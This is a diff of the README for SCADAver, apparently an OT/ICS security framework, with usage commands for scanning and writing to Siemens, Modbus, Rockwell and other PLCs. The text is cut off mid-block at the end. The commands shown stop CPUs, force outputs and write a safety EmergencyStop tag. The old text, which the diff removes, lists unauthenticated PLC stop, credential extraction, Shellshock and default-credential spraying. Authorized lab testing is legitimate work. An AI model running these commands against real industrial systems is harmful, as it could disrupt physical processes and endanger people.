@@ -1,294 +1,920 @@
-# scadaver
+# SCADAver
 
-> Unified ICS red team multi-tool - Rust edition.
+<!-- markdownlint-disable MD013 -->
 
+> A Rust-powered, multi-protocol OT/ICS security framework for authorized labs.
+
+[![CI](https://github.com/Whispergate/SCADAVER/actions/workflows/ci.yml/badge.svg)](https://github.com/Whispergate/SCADAVER/actions/workflows/ci.yml)
+[![Crates.io](https://img.shields.io/crates/v/scadaver)](https://crates.io/crates/scadaver)
 [![License: PolyForm Noncommercial 1.0](https://img.shields.io/badge/License-PolyForm%20Noncommercial%201.0-blue)](LICENSE)
-[![Rust](https://img.shields.io/badge/Rust-stable-orange)](https://www.rust-lang.org)
-[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey)]()
+[![Rust](https://img.shields.io/badge/Rust-1.87%2B-orange)](https://www.rust-lang.org)
+[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey)](https://github.com/Whispergate/SCADAVER/releases)
 
-**Experimental.** This tool is built from publicly available ICS protocol documentation, CVE advisories, and open-source security research. Direct access to hardware for testing is limited, so behavior on specific device models or firmware versions may differ from what is documented here. If you have access to ICS test equipment and can verify, correct, or extend any module, contributions are very welcome please open an issue or pull request.
+SCADAver discovers, fingerprints, enumerates, and performs controlled security validation across common industrial protocols. One binary provides a command-line interface, terminal UI, browser UI, REST API, persistent device database, and MQTT client shell. The protocol stack can also be used as a Rust library without the CLI dependencies.
 
-Discovers, enumerates, and exploits devices across twelve industrial control protocols.
-Single binary with a terminal UI, bloodyAD-style CLI, and REST web interface.
+> [!CAUTION]
+> SCADAver is for systems you own or have explicit written permission to test. Several operations can write controller data, change PLC state, test credentials, or disrupt a lab device. Treat every OT target as production-adjacent until proven otherwise.
 
+**Project status:** This project is experimental. It is built from public protocol documentation, vulnerability advisories, and open-source security research. Hardware access is limited, so behavior can vary by device model and firmware. Hardware-backed verification, corrections, and additional simulators are welcome.
 
----
+## Highlights
 
-## Features
+- Concurrent host and CIDR discovery across major OT/ICS protocols
+- CLI, TUI, browser UI, REST API, and MQTT shell in one binary
+- Read-only enumeration plus clearly identified sensitive and write operations
+- MQTT 3.1.1 and 5.0 sessions, TLS, Sparkplug detection, and guarded assessment tools
+- Nmap XML import and JSON or CSV device export
+- Persistent device, tag, and value history in SQLite
+- Configurable defaults and operator-supplied credential lists
+- Per-connection protocol fingerprint randomization and optional stealth jitter
+- Embedded ICS research reference database with roughly 300 entries
+- Local simulators and loopback integration tests for safe regression testing
+- Library-only builds with CLI, TUI, web, and database dependencies excluded
 
-- Active fingerprint and passive scan across 12 ICS protocols
-- TUI, CLI, and REST web interface in one binary
-- Authenticated and unauthenticated exploitation paths
-- Protocol fingerprint randomisation - always-on, no flags needed
-- Ephemeral-token web API - no credential file, no config
-- ~300-entry ICS CVE reference database built in
-- Local simulator suite (`sim/`) for safe offline testing
-- Usable as a Rust library (`scadaver` crate)
+## Installation
 
----
+SCADAver requires Rust 1.87 or newer when building from source.
 
-## Install
+### Release binaries
 
-**From crates.io (recommended):**
+Prebuilt Windows, Linux, and macOS binaries are published on the [GitHub Releases page](https://github.com/Whispergate/SCADAVER/releases).
+
+### crates.io
+
 ```sh
 cargo install scadaver
 ```
 
-**From source:**
+The crates.io package can trail the repository. Build from source when you need the current `main` branch feature set.
+
+### Source
+
 ```sh
-git clone https://github.com/Whispergate/SCADAVER
-cd scadaver
+git clone https://github.com/Whispergate/SCADAVER.git
+cd SCADAVER
 cargo build --release
-# binary: target/release/scadaver
 ```
 
----
+The binary is written to `target/release/scadaver` or `target/release/scadaver.exe`.
 
 ## Quick Start
 
+Start with read-only discovery and enumeration against an authorized lab target:
+
 ```sh
-scadaver scan                                       # sweep local network, all protocols
-scadaver scan --protocol siemens -i 10.0.0.50       # targeted S7 fingerprint
-scadaver get io -i 10.0.0.50 --protocol siemens     # read digital I/O state
-scadaver run fc90-stop -i 192.168.1.10              # unauthenticated Schneider stop
-scadaver tui                                        # interactive terminal UI
-scadaver web --host 0.0.0.0 --port 8080             # REST API + browser UI
+# Probe one host across every autodetect protocol
+scadaver -i 10.0.0.50 scan
+
+# Scan a CIDR range
+scadaver --network 10.0.0.0/24 scan
+
+# Target one supported CLI protocol
+scadaver -i 10.0.0.50 --protocol siemens scan
+
+# Read Siemens digital I/O state
+scadaver -i 10.0.0.50 --protocol siemens get io
+
+# Launch the terminal or browser interface
+scadaver tui
+scadaver web
+
+# Open the interactive MQTT shell with a pre-populated broker
+scadaver mqtt --host 10.0.0.60 --port 1883
 ```
 
----
+Use `scadaver --help` and `scadaver <command> --help` for the authoritative command syntax.
 
-## Supported Protocols
+## Protocol Coverage
 
-| Protocol | Vendor | Port(s) | Discovery | Exploitation | Auth |
-|---|---|---|---|---|---|
-| S7Comm / ISO-TCP | Siemens | TCP 102 | COTP fingerprint, PDU info | I/O and DB r/w, CPU start/stop, password spray | optional password |
-| ADS/AMS | Beckhoff TwinCAT | UDP 48899, TCP 48898 | broadcast NetID | run/config state, symbol r/w, add route | none (pre-4024) |
-| Modbus TCP | Schneider / generic | TCP 502 | FC43 Device ID, UDP 1740 | FC1/3/4/5/6/16, false-data injection, rogue server | none |
-| FC90 | Schneider M340/TM221 | TCP 502 | function-code probe | stop, start, force output bit | none |
-| EtherNet/IP + CIP | Rockwell Allen-Bradley | TCP/UDP 44818 | ListIdentity broadcast | tag enumeration, tag r/w | none |
-| SLMP / MC 3E | Mitsubishi MELSEC | UDP 5561, TCP 5007 | UDP broadcast | D/M register r/w | none |
-| FINS | Omron SYSMAC | TCP/UDP 9600 | UDP broadcast | DM area r/w, CPU state | none |
-| HTTP + IPCONF | HMS eWON Flexy | TCP 80, UDP 1507 | IPCONF UDP broadcast | auth-bypass credential extract (CVE-2019-9015) | HTTP Basic |
-| ProConOS + WebVisit | Phoenix Contact | TCP 1962, 80/8080 | HTTP probe | password retrieval (CVE-2016-8366), tag r/w | HTTP Basic |
-| SNMPv2c | generic | UDP 161 | community scan | GET, GETNEXT, walk, SET | community string |
-| IEC 60870-5-104 | generic RTU/relay | TCP 2404 | TESTFR probe | GI dump, single command, double command | none |
-| HTTP Basic | generic | TCP 80/443/8080 | TCP connect | default-cred spray, Shellshock (CVE-2014-6271) | configurable |
+| Protocol or family | Default port(s) | Discovery and enumeration | Controlled validation and actions |
+| --- | ---: | --- | --- |
+| S7Comm / ISO-on-TCP | TCP 102 | COTP fingerprinting, PDU and device data, CPU state, I/O and DB reads | I/O and DB writes, CPU state changes, password testing |
+| ADS/AMS / TwinCAT | UDP 48899, TCP 48898 | Broadcast discovery, AMS Net ID, runtime state, symbols | State and symbol writes, route and CX web-control actions |
+| Modbus TCP / Schneider FC90 | TCP 502, UDP 1740 | Device ID, register, input-register, and coil reads | FC5/6/16 writes, FC90 actions, false-data injection, lab server |
+| EtherNet/IP and CIP | TCP/UDP 44818 | ListIdentity, controller identity, Logix tag and UDT enumeration | Typed and raw tag writes |
+| SLMP / MC Protocol 3E | TCP 5007, UDP 5561 | MELSEC discovery and D/M device reads | D word, M bit, and controller-state writes |
+| FINS | TCP/UDP 9600 | SYSMAC discovery, device information, CPU state, DM reads | DM writes and CPU-state changes |
+| eWON IPCONF and HTTP | UDP 1507, TCP 80 | IPCONF discovery and device metadata | Authorized credential-store validation |
+| ProConOS and WebVisit | TCP 1962, 80/8080 | Controller identity and WebVisit tag enumeration | Tag writes and password-retrieval validation |
+| SNMPv1/v2c | UDP 161 | Community discovery, GET, GETNEXT, walk, system and topology data | Guarded SNMP SET |
+| IEC 60870-5-104 | TCP 2404 | TESTFR detection and General Interrogation | Single and double commands |
+| MQTT and Sparkplug B | TCP 1883, 8883 | Anonymous access, `$SYS` recon, topic monitoring, retained data, Sparkplug detection | Pub/sub, ACL probes, session tests, guarded Sparkplug fuzzing |
+| BACnet/IP | UDP 47808 | Who-Is/I-Am discovery and device property reads | Read-only client surface |
+| DNP3 | TCP 20000 | Link detection, device attributes, integrity polling | Read-only client surface |
+| OPC UA Binary | TCP 4840 | HEL/ACK, secure-channel setup, endpoint and security-mode discovery | Read-only endpoint assessment |
+| Generic HTTP(S) | TCP 80, 443, 8080 | OT port scanning and web endpoint checks | Default-credential and Shellshock validation |
 
-### Protocol Fingerprint Hardening
+The all-protocol host and CIDR sweep includes BACnet, DNP3, and OPC UA. The explicit `--protocol` choices currently exposed by the CLI are `beckhoff`, `siemens`, `schneider`, `modbus`, `rockwell`, `mitsubishi`, `omron`, `phoenix`, `ewon`, `snmp`, `iec104`, `enip`, and `mqtt`.
 
-Six fields that previously fingerprinted the tool are randomised per-connection: Modbus MBAP
-transaction ID, two Siemens S7Comm PDU references, Omron FINS SA1 source node, Beckhoff ADS
-route hostname (OS hostname, never the tool name), and IEC 104 teardown (graceful FIN instead
-of RST). These are always-on. Stealth mode (`-z`) adds probe-order shuffle and 100-400 ms
-inter-probe jitter on top.
+### Scan Fingerprint Hardening
 
----
+SCADAver randomizes protocol fields that would otherwise be stable across connections, including Modbus transaction IDs, Siemens PDU references, the FINS source node, and the Beckhoff route hostname. IEC 104 sessions close gracefully. Stealth mode adds randomized probe order and 100 to 400 ms of inter-probe jitter:
+
+```sh
+scadaver -z -i 10.0.0.50 scan
+```
+
+Stealth mode reduces simple scan fingerprinting. It does not make traffic invisible to network monitoring or process-aware OT defenses.
 
 ## Interfaces
 
-### TUI
+### CLI
+
+```text
+scadaver [OPTIONS] [COMMAND]
+```
+
+| Option | Short | Default | Purpose |
+| --- | ---: | ---: | --- |
+| `--ip <IP>` | `-i` | none | Target a single host |
+| `--network <CIDR>` | | none | Scan every address in a CIDR range |
+| `--port <PORT>` | `-p` | protocol default | Override the target port |
+| `--timeout <SECONDS>` | `-t` | config or `5` | Override the network timeout |
+| `--protocol <PROTOCOL>` | | autodetect | Select a supported targeted or broadcast protocol |
+| `--stealth` | `-z` | config or off | Shuffle probes and add jitter |
+
+| Command | Purpose |
+| --- | --- |
+| `scan` | Targeted, broadcast, all-protocol, or CIDR discovery |
+| `get` | Read identity, state, tags, registers, coils, OIDs, or protocol data |
+| `set` | Write controller state, tags, registers, coils, OIDs, or protocol data |
+| `run` | Execute a vendor-specific or generic assessment action |
+| `tui` | Launch the interactive terminal UI |
+| `web` | Start the browser UI and REST service |
+| `db` | Add or remove devices and query the embedded research references |
+| `mqtt` | Open the interactive MQTT client shell |
+| `import` | Import hosts and open ports from nmap XML |
+| `export` | Export the device database as JSON or CSV |
+
+### Terminal UI
+
+Run `scadaver` with no command or launch it explicitly:
 
 ```sh
 scadaver tui
 ```
 
 | Key | Action |
-|-----|--------|
-| `A` | Add IP |
-| `S` | Scan menu |
-| `E` | Exploit menu |
-| `W` | References overlay |
-| `R` | Rescan selected device |
-| `D` | Delete selected device |
-| `V` | VendorPicker (for multi-protocol devices) |
-| `/` | Search / filter device list |
-| `O` | Zoom output panel |
+| --- | --- |
+| `A` | Add or probe an IP, optional port, transport, or vendor hint |
+| `S` | Open broadcast scan menu |
+| `E` | Open actions for the selected device |
+| `M` | Open the MQTT monitor |
+| `U` | Set MQTT credentials for the next connection |
+| `B` | Open research references for the selected vendor |
+| `I` | Import an nmap XML file |
+| `W` | Set a credential wordlist path |
+| `R` | Rescan the selected device |
+| `D` | Delete the selected database record |
+| `/` | Search or filter devices |
+| `O` | Zoom the output panel |
 | `C` | Clear output |
+| `F` | Toggle JSON or CSV export format |
+| `X` | Export the device database |
+| `t` | Toggle MQTT TLS for the next connection |
+| `v` | Toggle MQTT 3.1.1 or 5.0 for the next connection |
 | `Z` | Toggle stealth mode |
-| `?` | Help overlay |
-| `Q` | Quit |
+| `?` | Open help |
+| `Q` | Quit with confirmation |
 
-Sensitive and write actions require typing `YES` before execution. When multiple protocols
-respond for the same IP, the device is stored as `multi` and `V` switches which protocol's
-exploit list is active.
+Sensitive reads and write actions in the TUI require typed confirmation. Devices responding on multiple protocols are stored as `multi`; use `V` inside the action menu to choose the protocol view.
 
----
-
-### CLI
+### MQTT Shell
 
 ```sh
-scadaver [OPTIONS] <COMMAND>
+scadaver mqtt
+scadaver mqtt --host broker.lab --port 1883
 ```
 
-**Global flags:**
+The three-level shell supports connection configuration, MQTT 3.1.1 or 5.0, TLS, last-will settings, topic subscriptions, publishing, logging, filters, topic statistics, `$SYS` recon, retained-message hunting, ACL probes, stored-session testing, and the guarded Sparkplug B fuzzer. Type `help` at any prompt and run `spfuzz --dry-run` before an active fuzzing session.
 
-| Flag | Short | Default | Description |
-|------|-------|---------|-------------|
-| `--ip <IP>` | `-i` | | Target host IP |
-| `--port <N>` | `-p` | `0` | Override port (0 = protocol default) |
-| `--timeout <N>` | `-t` | `5` | Timeout in seconds |
-| `--protocol <P>` | | | Protocol hint (`siemens`, `rockwell`, `beckhoff`, ...) |
-| `--stealth` | `-z` | off | Randomised probe order + inter-probe jitter |
-
-**`scan`** - probe for ICS devices on the local segment or a single IP
-
-**`get` nouns:**
-
-| Noun | Description |
-|------|-------------|
-| `info` | Device identity and firmware (`--protocol` required) |
-| `state` | CPU run/stop/monitor state |
-| `io` | Siemens S7 digital inputs, outputs, merkers |
-| `tags` | Tag or symbol list |
-| `tag <name>` | Read one named tag |
-| `register [start] [count]` | Modbus holding registers (FC3) |
-| `input-register [start] [count]` | Modbus input registers (FC4) |
-| `coil [start] [count]` | Modbus coils (FC1) |
-| `dm [start] [count]` | Omron FINS DM area words |
-| `db <db> [offset] [len]` | Siemens S7 data block bytes |
-| `d [start] [count]` | Mitsubishi SLMP D word registers |
-| `m [start] [count]` | Mitsubishi SLMP M bit devices |
-| `community` | SNMP community string probe |
-| `oid <oid> [-c community]` | SNMP GET single OID |
-| `walk <oid> [-c community]` | SNMP GETNEXT walk |
-| `enum` | SNMP system info, interfaces, topology |
-| `gi` | IEC 104 General Interrogation |
-| `creds` | eWON auth-bypass credential extract |
-| `session` | Schneider legacy web-session compatibility check |
-
-**`set` nouns:**
-
-| Noun | Description |
-|------|-------------|
-| `state <state>` | CPU state: run/stop/monitor/config/flip (`--protocol` required) |
-| `tag <NAME=HEXBYTES>` | Write one tag |
-| `register <address> <value>` | Modbus holding register (FC6) |
-| `registers <start> <values>` | Multiple Modbus holding registers (FC16) |
-| `coil <address> <on\|off>` | Modbus coil (FC5) |
-| `output <bits>` | Siemens S7 digital outputs (binary string) |
-| `merkers <bits> <offset>` | Siemens S7 merkers |
-| `dm <start> <values>` | Omron FINS DM area words |
-| `db <db> [offset] <data>` | Siemens S7 data block bytes |
-| `d <start> <values>` | Mitsubishi SLMP D word registers |
-| `m <start> <bits>` | Mitsubishi SLMP M bit devices |
-| `oid <oid> <value> --community --type` | SNMP SET (`--confirm` required) |
-| `sc <ioa> <on\|off>` | IEC 104 Single Command |
-| `dc <ioa> [state]` | IEC 104 Double Command |
-
-**`run` exploits:**
-
-| Command | Description |
-|---------|-------------|
-| `reboot` | Beckhoff CX9020 reboot via UPnP/SOAP (CVE-2015-4051) |
-| `add-user <credentials>` | Add admin user to CX9020 via UPnP/SOAP (default password: `Sc4d4v3r!`) |
-| `write-symbol <NAME=hexbytes>` | Write raw bytes to ADS symbol |
-| `flash-led` | Schneider identification LED flash |
-| `session-stop` | Schneider PLC stop via recovered legacy web session |
-| `session-run` | Schneider PLC start via recovered legacy web session |
-| `fc90-stop [--model m340\|tm221]` | Unauthenticated Schneider FC90 stop |
-| `fc90-start [--model m340\|tm221]` | Unauthenticated Schneider FC90 start |
-| `fc90-force [--output] [--state]` | Force physical output bit on M340 |
-| `passwords` | Retrieve Phoenix Contact WebVisit passwords (CVE-2016-8366) |
-| `ewon-creds` | eWON auth-bypass credential extract |
-| `portscan [--ports]` | TCP connect scan for common ICS ports |
-| `shellshock [--http-port]` | Shellshock scanner on PLC/HMI web CGI (CVE-2014-6271) |
-| `default-creds [--path]` | HTTP Basic Auth default-credential spray |
-| `fdi` | False Data Injection - continuous Modbus write loop |
-| `modbus-server` | Rogue Modbus TCP server (no `-i` needed) |
-
-**`db` commands:**
-
-| Command | Description |
-|---------|-------------|
-| `db add --ip <IP> [--vendor]` | Add a device to the database |
-| `db remove --id <id>` | Remove a device by ID |
-| `db refs [--vendor <slug>]` | List embedded ICS research references |
-
----
-
-### Web API
+### Web UI and API
 
 ```sh
-scadaver web                            # 127.0.0.1:8888
+scadaver web
 scadaver web --host 0.0.0.0 --port 9000
 ```
 
-A 32-character hex token is generated at startup and printed to the terminal. The browser
-opens automatically at `http://host:port/?key=<token>`. REST clients send `X-API-Key: <token>`
-on protected endpoints (scan, device tags, tag write, all exploit routes). The token is
-ephemeral - a new one is generated each run.
+The default listener is `127.0.0.1:8888`. At startup, SCADAver uses the configured API key or generates a 32-character hexadecimal session token, prints it to the terminal, and opens the browser with `?key=<token>`. REST clients pass the token in the `X-API-Key` header on protected operations.
 
-Endpoints that do not require authentication: `GET /health`, `GET /api/devices`,
-`GET /api/devices/:ip/history`.
+The browser UI provides device persistence, targeted and broadcast scans, tag browsing and writes, history, port scanning, exports, protocol actions, and WebSocket-backed live device and tag updates. Binding to a non-loopback address exposes the service to the network, so use a fixed API key and an isolated assessment network.
 
----
+Key routes include:
 
-## ICS References Database
+| Route | Purpose |
+| --- | --- |
+| `GET /health` | Health check |
+| `GET /api/interfaces` | Local network interfaces |
+| `GET/POST /api/devices` | List or save devices |
+| `POST /api/scan` | Broadcast discovery |
+| `POST /api/scan/ip` | All-protocol host scan |
+| `POST /api/device/tags` | Enumerate device tags or points |
+| `POST /api/device/write` | Write a device tag or point |
+| `GET /api/device/history?ip=<IP>&vendor=<VENDOR>` | Device tag or value history |
+| `POST /api/exploit/<ACTION>` | Run an assessment action |
+| `GET /api/export?format=json\|csv` | Export stored devices |
+| `WS /ws/events` | Live device events |
+| `WS /ws/monitor/<IP>?vendor=<VENDOR>` | Live tag monitoring |
 
-~300 publicly disclosed ICS vulnerability writeups embedded in the binary, sourced from
-[awesome-ics-writeups](https://github.com/neutrinoguy/awesome-ics-writeups). Entries from
-Claroty, ZDI, Nozomi Networks, Microsoft, Dragos, and others.
+The route table describes the current interface, but it is not a substitute for network isolation. Review `src/web/routes.rs` before exposing the service beyond localhost.
 
-**TUI:** press `W`. **CLI:** `scadaver db refs [--vendor <slug>]`
+## Discovery and Enumeration
 
-| Slug | Covers |
-|------|--------|
-| `beckhoff` | Beckhoff, TwinCAT, ADS |
-| `siemens` | Siemens, SIMATIC, S7, SCALANCE, SINEC, TIA Portal, PROFINET |
-| `schneider` | Schneider Electric, Modicon, M340/M580/M221, EcoStruxure, UMAS |
-| `rockwell` | Rockwell, Allen-Bradley, FactoryTalk, RSLogix, ControlLogix |
-| `mitsubishi` | Mitsubishi, MELSEC, SLMP, GX Works |
-| `omron` | Omron, SYSMAC, CX-Programmer, FINS |
-| `phoenix` | Phoenix Contact, ProConOS, PLCnext |
-| `ewon` | eWON, HMS Networks |
-| `modbus` | Modbus protocol |
-| `iec104` | IEC 60870-5-104, IEC 62351 |
-| `enip` | EtherNet/IP, CIP |
-| `snmp` | SNMP |
-| `malware` | ICS malware: Triton/TRISIS, Industroyer, PIPEDREAM, Havoc |
-| `ics-general` | General OT/SCADA security research |
+### Network Scanning
 
-Refresh from upstream:
+```sh
+# All-protocol probe of a single host
+scadaver -i 10.0.0.50 scan
 
-```bash
+# CIDR sweep
+scadaver --network 10.0.0.0/24 scan
+
+# Protocol-specific broadcast discovery (no -i needed; picks the right interface)
+scadaver --protocol beckhoff scan      # UDP 48899 — returns NetID, TC version, kernel
+scadaver --protocol enip scan          # UDP 44818 — returns CIP vendor, device type, product name
+scadaver --protocol ewon scan          # UDP 1507  — returns serial, firmware, product code
+scadaver --protocol schneider scan     # UDP 1740  — returns device name, firmware, Modbus unit ID
+scadaver --protocol mitsubishi scan    # GX Works3 UDP 5561 + SLMP 5006 broadcast
+scadaver --protocol bacnet scan        # UDP 47808 Who-Is — collects all I-Am responses
+
+# OT port scan with banner grab
+scadaver run portscan -i 10.0.0.50
+scadaver run portscan -i 10.0.0.50 --ports 8888,9000
+```
+
+The port scanner checks 15 well-known OT ports (102, 502, 2404, 4840, 5007, 9600, 20000, 44818, 47808, and others) and grabs the first 80 bytes of each banner.
+
+### Siemens S7Comm
+
+```sh
+# Scan: returns hardware MLFB, firmware version, CPU state (Running/Stopped/Hold/Startup)
+scadaver -i 10.0.0.10 --protocol siemens scan
+
+# Device identity and module information
+scadaver -i 10.0.0.10 --protocol siemens get info
+
+# CPU run/stop state
+scadaver -i 10.0.0.10 --protocol siemens get state
+
+# Digital I/O and merker bit map (inputs, outputs, merkers by byte.bit)
+scadaver -i 10.0.0.10 get io
+
+# Read raw bytes from a Data Block (DB1, offset 0, 64 bytes)
+scadaver -i 10.0.0.10 get db 1 0 64
+scadaver -i 10.0.0.10 get db 5 128 16 --password SIMATIC
+```
+
+### Beckhoff TwinCAT
+
+```sh
+# Broadcast discovery: returns NetID, TwinCAT version, kernel version
+scadaver --protocol beckhoff scan
+
+# Unicast probe
+scadaver -i 10.0.0.20 --protocol beckhoff scan
+
+# ADS state: RUN / STOP / CONFIG / RECONFIG
+scadaver -i 10.0.0.20 --protocol beckhoff get state
+
+# Full symbol table with values (up to 500 scalar symbols)
+scadaver -i 10.0.0.20 --protocol beckhoff get tags
+
+# Read one named symbol
+scadaver -i 10.0.0.20 --protocol beckhoff get tag MAIN.valve
+scadaver -i 10.0.0.20 --protocol beckhoff get tag MAIN.pump_speed
+```
+
+Device info (TC3 only) includes target type, hardware model, serial number, OS name and version.
+
+### Schneider Electric / Modbus
+
+```sh
+# Discovery: Schneider proprietary UDP + Modbus Device ID fallback
+scadaver -i 10.0.0.30 --protocol schneider scan
+
+# Holding registers (FC3) — displayed as 4xxxx addresses
+scadaver -i 10.0.0.30 get register 0 20
+scadaver -i 10.0.0.30 get register 100 10 --port 502
+
+# Input registers (FC4) — displayed as 3xxxx addresses
+scadaver -i 10.0.0.30 get input-register 0 10
+
+# Coils (FC1) — ON/OFF per bit
+scadaver -i 10.0.0.30 get coil 0 16
+
+# Check for legacy session cookie in FwLog.txt
+scadaver -i 10.0.0.30 get session
+```
+
+### Rockwell / EtherNet/IP CIP
+
+```sh
+# Discovery: CIP List Identity + optional Logix Get Attribute
+scadaver -i 10.0.0.40 --protocol rockwell scan
+
+# Device identity: vendor, product type, product code, revision, serial, product name
+scadaver -i 10.0.0.40 --protocol rockwell get info
+
+# Full Logix tag table with UDT template expansion
+scadaver -i 10.0.0.40 --protocol rockwell get tags
+
+# Read one named tag (handles fragmented reads, UDT flattening)
+scadaver -i 10.0.0.40 --protocol rockwell get tag MAIN.conveyor_speed
+scadaver -i 10.0.0.40 --protocol rockwell get tag Program:SafetyPLC.EmergencyStop
+```
+
+UDT fields are recursively expanded; BOOL arrays and packed BOOLs are handled automatically.
+
+### Mitsubishi SLMP
+
+```sh
+# Discovery: GX Works3 UDP 5561 broadcast, SLMP UDP 5006, TCP 5007 fallback
+scadaver -i 10.0.0.50 --protocol mitsubishi scan
+
+# D word registers (word area, e.g. D0–D9)
+scadaver -i 10.0.0.50 get d 0 10
+scadaver -i 10.0.0.50 get d 100 20
+
+# M bit devices (bit area, e.g. M0–M15)
+scadaver -i 10.0.0.50 get m 0 16
+```
+
+### Omron FINS
+
+```sh
+# Discovery: FINS/UDP Controller Data Read, TCP two-stage fallback
+# Returns node address, model, version
+scadaver -i 10.0.0.60 --protocol omron scan
+
+# CPU state: Stop / Run / Monitor / Program
+scadaver -i 10.0.0.60 --protocol omron get state
+
+# DM word area (word area 0x82)
+scadaver -i 10.0.0.60 get dm 0 10
+scadaver -i 10.0.0.60 get dm 200 20
+```
+
+### Phoenix Contact
+
+```sh
+# Discovery: ProConOS TCP 1962 multi-step handshake
+# Returns PLC type, firmware, build
+scadaver -i 10.0.0.70 --protocol phoenix scan
+
+# WebVisit tag list from project file
+scadaver -i 10.0.0.70 --protocol phoenix get tags
+
+# Read live WebVisit tag values
+scadaver -i 10.0.0.70 --protocol phoenix get info
+```
+
+### eWON
+
+```sh
+# IPCONF UDP discovery: returns serial, product code, firmware, identifier
+scadaver -i 10.0.0.80 --protocol ewon scan
+
+# HTTP REST tag read (/api/tags/)
+scadaver -i 10.0.0.80 get tags --protocol ewon
+```
+
+### IEC 60870-5-104
+
+```sh
+# Detect IEC 104 on port 2404 (TESTFR handshake)
+scadaver -i 10.0.0.90 --protocol iec104 scan
+
+# General Interrogation — reads all data objects (IOAs)
+# Decodes: single-point, double-point, normalized, scaled, IEEE float, counters
+# with optional CP56Time2a timestamps
+scadaver -i 10.0.0.90 get gi
+```
+
+### DNP3
+
+```sh
+# Detect DNP3 on port 20000 (Reset Link States + Request Link Status)
+# Returns outstation address, then reads Group 0 device attributes:
+# vendor_name, product_name, firmware_version, hardware_version,
+# device_serial, device_name, user_assigned_location
+scadaver -i 10.0.0.95 --protocol dnp3 scan
+```
+
+Integrity polling (Class 0 data request) returns up to 32 frames.
+
+### BACnet/IP
+
+```sh
+# Broadcast Who-Is on UDP 47808 — collects all I-Am responses
+scadaver --protocol bacnet scan
+
+# Unicast probe — returns instance_id, vendor_id, max_apdu,
+# object_name, vendor_name, description, firmware_revision
+scadaver -i 10.0.0.100 --protocol bacnet scan
+```
+
+### SNMP
+
+```sh
+# Brute-force community string (tries: public, private, community, admin, and others)
+scadaver -i 10.0.0.110 get community
+
+# Full system enumeration: MIB-II system group, interface table,
+# ARP cache, route table, automatic CVE matching
+scadaver -i 10.0.0.110 get enum -c public
+
+# Get a specific OID
+scadaver -i 10.0.0.110 get oid 1.3.6.1.2.1.1.1.0 -c public   # sysDescr
+scadaver -i 10.0.0.110 get oid 1.3.6.1.2.1.1.6.0 -c public   # sysLocation
+
+# Walk an OID subtree (up to 512 GETNEXT iterations)
+scadaver -i 10.0.0.110 get walk 1.3.6.1.2.1 -c public         # full MIB-II
+scadaver -i 10.0.0.110 get walk 1.3.6.1.2.1.2 -c public       # interfaces only
+```
+
+`get enum` automatically runs CVE matching against the discovered `sysDescr` and OID. Matches include CVE-1999-0517 (default community accepted), SCALANCE X200 CVE-2007-5846, SCALANCE CP/SINEMA CVE-2021-41991, SCALANCE S auth bypass CVE-2013-3634, and APC write community exposure.
+
+### OPC UA
+
+```sh
+# Endpoint discovery: returns URL, security mode (None/Sign/SignAndEncrypt),
+# security policy, and whether anonymous access is permitted
+scadaver -i 10.0.0.120 --protocol opcua scan
+```
+
+## Write and Control
+
+> [!WARNING]
+> All write and control operations modify live controller state. Verify the target is an authorized lab device before executing any `set` or `run` command.
+
+### Modbus
+
+```sh
+# Write one holding register (FC6)
+scadaver -i 10.0.0.30 set register 100 1234
+
+# Write multiple holding registers (FC16, comma-separated values)
+scadaver -i 10.0.0.30 set registers 0 100,200,300,400
+
+# Write one coil (FC5)
+scadaver -i 10.0.0.30 set coil 5 on
+scadaver -i 10.0.0.30 set coil 5 off
+```
+
+### Siemens S7Comm
+
+```sh
+# Toggle CPU state (Running ↔ Stopped via TIA Portal OMS+ protocol)
+scadaver -i 10.0.0.10 --protocol siemens set state flip
+
+# Set CPU to Run or Stop explicitly (requires auth if password-protected)
+scadaver -i 10.0.0.10 --protocol siemens set state run
+scadaver -i 10.0.0.10 --protocol siemens set state stop --password SIMATIC
+
+# Write digital outputs (8-bit binary string, leftmost = Q0.0)
+scadaver -i 10.0.0.10 set output 10110100
+
+# Write merkers at a specific byte offset
+scadaver -i 10.0.0.10 set merkers 10110100,4
+
+# Write raw bytes to a Data Block (hex string, no spaces)
+scadaver -i 10.0.0.10 set db 1 0 deadbeef
+scadaver -i 10.0.0.10 set db 5 128 0100 --password SIMATIC
+```
+
+### Beckhoff TwinCAT
+
+```sh
+# Change TwinCAT runtime state
+scadaver -i 10.0.0.20 --protocol beckhoff set state run
+scadaver -i 10.0.0.20 --protocol beckhoff set state stop
+scadaver -i 10.0.0.20 --protocol beckhoff set state config
+
+# Write raw bytes to a symbol by name (hex, no spaces)
+# Looks up the symbol in the ADS symbol table, then writes to its address
+scadaver -i 10.0.0.20 --protocol beckhoff set tag MAIN.valve=01
+scadaver -i 10.0.0.20 --protocol beckhoff set tag MAIN.pump_speed=05DC
+```
+
+### Rockwell / EtherNet/IP CIP
+
+```sh
+# Write a typed tag value (hex bytes matching the CIP type)
+scadaver -i 10.0.0.40 --protocol rockwell set tag MAIN.conveyor_speed=01F4
+scadaver -i 10.0.0.40 --protocol rockwell set tag Program:SafetyPLC.EmergencyStop=01
+```
+
+### Mitsubishi SLMP
+
+```sh
+# Write D word registers (comma-separated u16 values)
+scadaver -i 10.0.0.50 set d 100 1000,2000
+scadaver -i 10.0.0.50 set d 0 0,0,0,0,0
+
+# Write M bit devices (binary string of 0/1 characters)
+scadaver -i 10.0.0.50 set m 0 10110100
+
+# PLC run/stop/pause via captured GX Works2 UDP protocol (port 5560)
+scadaver -i 10.0.0.50 --protocol mitsubishi set state stop
+scadaver -i 10.0.0.50 --protocol mitsubishi set state run
+scadaver -i 10.0.0.50 --protocol mitsubishi set state monitor
+```
+
+### Omron FINS
+
+```sh
+# Write DM area words (comma-separated u16 values)
+scadaver -i 10.0.0.60 set dm 0 1234,5678
+scadaver -i 10.0.0.60 set dm 100 0,0,0,0
+
+# CPU mode change
+scadaver -i 10.0.0.60 --protocol omron set state stop
+scadaver -i 10.0.0.60 --protocol omron set state run
+```
+
+### Phoenix Contact
+
+```sh
+# PLC run/stop (ILC 150 and ILC 390 supported)
+scadaver -i 10.0.0.70 --protocol phoenix set state stop
+scadaver -i 10.0.0.70 --protocol phoenix set state run
+
+# Write a WebVisit tag value
+scadaver -i 10.0.0.70 --protocol phoenix set tag WebVisit.pump_cmd=01
+```
+
+### IEC 60870-5-104
+
+```sh
